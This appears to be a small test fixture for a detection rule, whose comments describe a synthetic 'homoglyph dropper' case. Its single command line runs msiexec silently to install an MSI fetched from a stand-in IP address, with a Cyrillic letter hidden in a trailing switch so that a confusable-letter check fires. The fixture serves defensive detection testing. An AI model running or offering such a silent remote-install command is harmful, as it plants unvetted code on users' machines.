# Synthetic homoglyph dropper control: the quiet switch is ASCII but the
# trailing switch swaps in a Cyrillic letter (U+043E). The confusable-letter
# atom must fire here.
msiexec /quiet /i http://192.0.2.9/r.msi /qnо
